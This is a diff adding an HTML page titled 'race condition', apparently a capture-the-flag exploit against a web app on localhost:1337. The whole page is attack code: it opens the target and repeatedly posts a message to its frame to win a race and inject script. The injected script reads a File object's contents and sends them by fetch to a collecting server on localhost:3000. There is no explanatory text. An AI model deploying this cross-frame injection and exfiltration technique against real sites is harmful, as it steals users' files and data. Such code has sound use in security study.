@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>race condition</title>
+</head>
+<body>
+  <script>
+    const f = window.open("http://localhost:1337#x,a.list-group-item:nth-child(1)");
+
+    function race() {
+      if (f.frames.length > 0)
+      {
+        f.frames[0].postMessage(
+          {
+            body: `
+                <script>
+                  window.onmessage = function(e) {
+                    if (e.data.body instanceof File) {
+                    let reader = new FileReader();
+                    reader.readAsBinaryString(e.data.body);
+                    reader.onloadend = function() {
+                      fetch("http://localhost:3000?contents=" + encodeURIComponent(reader.result));
+                    };
+                    }
+                  }
+                <\/script>
+            `,
+            mimeType: "text/html"
+          }, "*");
+      }
+    }
+
+    setInterval(race, 50);
+
+    window.onmessage = (e) => {
+      if (e.data === "blob loaded") {
+        alert("sb9to hhh");
+      }
+    };
+  </script>
+</body>
+</html>
